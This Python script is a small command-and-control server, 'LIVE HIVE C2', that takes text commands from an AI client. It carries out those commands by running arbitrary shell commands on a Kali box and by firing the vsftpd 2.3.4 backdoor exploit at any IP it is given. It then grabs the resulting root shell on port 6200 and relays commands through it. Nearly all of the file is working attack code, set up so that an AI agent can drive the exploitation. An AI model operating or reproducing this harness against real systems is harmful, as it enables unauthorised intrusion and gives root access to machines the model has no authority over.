#!/usr/bin/env python3
import socket, threading, subprocess, time

HOST = '127.0.0.1'
PORT = 9999

# Node 1 is our Kali Attacker Box. Node 2 will be the Exploited Target.
nodes = {1: "LOCAL_KALI_STAGING"}
exploited_sockets = {}

def execute_local_task(cmd):
    try:
        # Executes the raw Nmap command on the Kali machine
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8')
    except Exception as e:
        return str(e)

def trigger_vsftpd_exploit(target_ip):
    try:
        print(f"[*] Spear Initiated: Throwing vsftpd 2.3.4 payload at {target_ip}:21...")
        # 1. Trigger the backdoor via raw socket (The Smiley Face Payload)
        trigger_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        trigger_sock.settimeout(3)
        trigger_sock.connect((target_ip, 21))
        trigger_sock.recv(1024)
        trigger_sock.send(b"USER chimera:)\r\n")
        trigger_sock.recv(1024)
        trigger_sock.send(b"PASS ignite\r\n")
        trigger_sock.close()
        
        time.sleep(1.5) # Wait for the backdoor port to open
        
        # 2. Catch the spawned root shell on port 6200
        print(f"[*] Catching backdoor shell on {target_ip}:6200...")
        shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell_sock.settimeout(5)
        shell_sock.connect((target_ip, 6200))
        
        # Bind the live socket to Node 2
        nodes[2] = target_ip
        exploited_sockets[2] = shell_sock
        return f"[+] GHOST SHELL SECURED: {target_ip} connected as Node 2 via vsftpd."
    except Exception as e:
        return f"[-] Spear failed: {e}"

def execute_remote_task(node_id, cmd):
    if node_id not in exploited_sockets:
        return f"[-] FATAL: Node {node_id} is not an active shell."
    
    sock = exploited_sockets[node_id]
    try:
        # Send command down the raw socket
        sock.send((cmd + "\n").encode('utf-8'))
        time.sleep(0.5)
        response = sock.recv(4096).decode('utf-8')
        
        # If the AI ran its final validation commands, append the killswitch
        if "whoami" in cmd or "uname" in cmd:
            response += "\n[+] MISSION ACCOMPLISHED"
            
        return response
    except Exception as e:
        return f"[-] Broken pipe on Node {node_id}: {e}"

def handle_ai_connection(client_socket):
    request = client_socket.recv(4096).decode('utf-8').strip()
    print(f"\n[AI COMMAND RECEIVED] {request}")
    
    parts = request.split()
    cmd_type = parts[0]
    
    response = ""
    if cmd_type == "nodes":
        response = "--- Active Chimera Nodes ---\n"
        for nid, ip in nodes.items():
            response += f"[{nid}] {ip} - Status: ALIVE\n"
        response += "----------------------------"
        
    elif cmd_type == "task":
        if len(parts) < 3:
            response = "[-] Task syntax error. Usage: task <id> <command>"
        else:
            node_id = int(parts[1])
            bash_cmd = " ".join(parts[2:])
            if node_id == 1:
                response = f"[+] Task '{bash_cmd}' Output:\n" + execute_local_task(bash_cmd)
            else:
                response = f"[+] Target Shell Output:\n" + execute_remote_task(node_id, bash_cmd)
                
    elif cmd_type == "spear":
        if len(parts) < 2:
            response = "[-] Spear syntax error. Usage: spear <ip>"
        else:
            target_ip = parts[1]
            response = trigger_vsftpd_exploit(target_ip)
            
    else:
        response = f"[-] Command '{cmd_type}' not implemented in live hive."

    client_socket.sendall(response.encode('utf-8'))
    client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] LIVE HIVE C2 ACTIVE. Listening on {HOST}:{PORT}")
    
    while True:
        client_sock, addr = server.accept()
        client_handler = threading.Thread(target=handle_ai_connection, args=(client_sock,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
